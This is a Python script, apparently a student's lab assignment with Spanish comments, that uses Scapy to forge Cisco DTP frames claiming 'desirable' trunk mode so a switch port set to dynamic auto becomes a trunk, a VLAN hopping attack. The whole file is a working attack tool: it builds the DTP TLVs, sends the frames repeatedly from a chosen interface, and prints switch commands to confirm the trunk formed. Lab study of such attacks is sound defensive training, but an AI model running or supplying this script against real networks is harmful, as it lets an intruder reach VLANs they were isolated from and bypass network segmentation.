#!/usr/bin/env python3
# dtp_vlan_hopping.py
# Nombre: Sael German Garcia | Matricula: 2025-0725
# Objetivo: DTP VLAN Hopping - convertir puerto dynamic auto en trunk usando Scapy

import time
import struct
import argparse

from scapy.layers.l2 import Dot3, LLC, SNAP
from scapy.packet import Raw
from scapy.sendrecv import sendp
from scapy.arch import get_if_hwaddr


DST_MAC = "01:00:0c:cc:cc:cc"
DTP_PID = 0x2004


def mac_to_bytes(mac):
    return bytes(int(x, 16) for x in mac.split(":"))


def build_tlv(tlv_type, value):
    """
    DTP usa TLVs:
    Type: 2 bytes
    Length: 2 bytes
    Value: variable
    """
    return struct.pack(">HH", tlv_type, len(value) + 4) + value


def build_dtp_packet(iface, domain):
    src_mac = get_if_hwaddr(iface)

    # DTP version 1
    dtp_payload = b"\x01"

    # TLV 0x0001 = Domain
    dtp_payload += build_tlv(0x0001, domain.encode("ascii"))

    # TLV 0x0002 = Status
    # 0x03 simula modo desirable para negociar trunk con un puerto dynamic auto.
    dtp_payload += build_tlv(0x0002, b"\x03")

    # TLV 0x0003 = DTP Type
    # 0xa5 representa trunk 802.1Q en este laboratorio.
    dtp_payload += build_tlv(0x0003, b"\xa5")

    # TLV 0x0004 = Neighbor
    dtp_payload += build_tlv(0x0004, mac_to_bytes(src_mac))

    pkt = (
        Dot3(dst=DST_MAC, src=src_mac) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=DTP_PID) /
        Raw(load=dtp_payload)
    )

    return pkt


def run_attack(iface, domain, seconds, interval):
    pkt = build_dtp_packet(iface, domain)

    print("=" * 60)
    print(" DTP VLAN HOPPING ATTACK")
    print(" Sael German Garcia | 2025-0725")
    print("=" * 60)
    print(f"[+] Interfaz atacante : {iface}")
    print(f"[+] Dominio DTP/VTP   : {domain}")
    print(f"[+] Destino multicast : {DST_MAC}")
    print(f"[+] Tiempo de envio   : {seconds} segundos")
    print("[+] Enviando paquetes DTP para negociar trunk...")
    print("=" * 60)

    end_time = time.time() + seconds

    count = 0

    while time.time() < end_time:
        sendp(pkt, iface=iface, verbose=False)
        count += 1
        print(f"[+] DTP enviado #{count}")
        time.sleep(interval)

    print("=" * 60)
    print("[+] Ataque DTP finalizado.")
    print("[+] Verifica en SW1-CORE:")
    print("    show interfaces e0/3 switchport")
    print("    show interfaces trunk")
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(description="DTP VLAN Hopping con Scapy")
    parser.add_argument("-i", "--iface", default="ens3", help="Interfaz atacante. Default: ens3")
    parser.add_argument("-d", "--domain", default="LAB", help="Dominio DTP/VTP. Default: LAB")
    parser.add_argument("-s", "--seconds", type=int, default=90, help="Tiempo enviando DTP. Default: 90")
    parser.add_argument("-t", "--interval", type=float, default=1.0, help="Intervalo entre paquetes. Default: 1.0")

    args = parser.parse_args()

    run_attack(args.iface, args.domain, args.seconds, args.interval)


if __name__ == "__main__":
    main()
